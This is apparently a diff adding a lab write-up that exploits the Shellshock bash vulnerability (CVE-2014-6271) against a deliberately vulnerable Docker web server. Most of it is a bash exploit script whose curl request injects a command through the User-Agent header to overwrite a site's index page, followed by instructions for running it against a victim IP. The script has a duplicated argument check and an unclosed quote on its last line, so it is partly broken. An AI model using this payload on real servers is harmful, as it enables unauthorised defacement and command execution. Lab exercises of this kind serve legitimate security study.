@@ -1,0 +1,52 @@
+ATTACK
+
+SHELLSHOCK - WEB
+
+In this attack, we used the vulnerability (CVE-2014-6271), however, we implemented it on a web server running on a docker container to deface that web page.
+
+at first I run apache2 service
+
+--> systemctl start apache2.service
+
+
+Then I run docker container on port 8080
+
+--> docker run --rm -it -p 8080:80 vulnerabilities/cve-2014-6271
+
+
+Now, the attacker will run the following script to exploit the vulnerability
+
+exploit
+--------------------------------------------------------------------
+#!/bin/bash
+
+if [ -z "$1" ]
+then
+    echo 'Please inform the IP and PORT of the target'
+    echo 'Example: ./exploit-deface.sh <ip> <port>'
+    return -1
+fi
+
+if [ -z "$1" ]                
+then                          
+   echo 'Please inform the IP and PORT of the target'  
+   echo 'Example: ./exploit-deface.sh <ip> <port>'             
+   return -1                                                                                                           
+fi  
+
+ip=$1                  
+port=$2
+
+echo '[+] Sending the exploit'  
+curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'echo \"<html><body><h1>DEFACED</h1></body></html>\" > /var/www/index.html'" http://$ip:$port/cgi-bin/vulnerable && \     
+echo '[+] Target exploited, testing if defacement page is deployed' && \                                                
+curl http://$ip:$port                                                                                                   
+echo '[+] Done
+---------------------------------------------------------------------------
+
+
+
+--> ./exploit-deface.sh   #victim-ip-address  8080
+
+and now, if we enter victim ip address in our browser the web page is defaced.
+
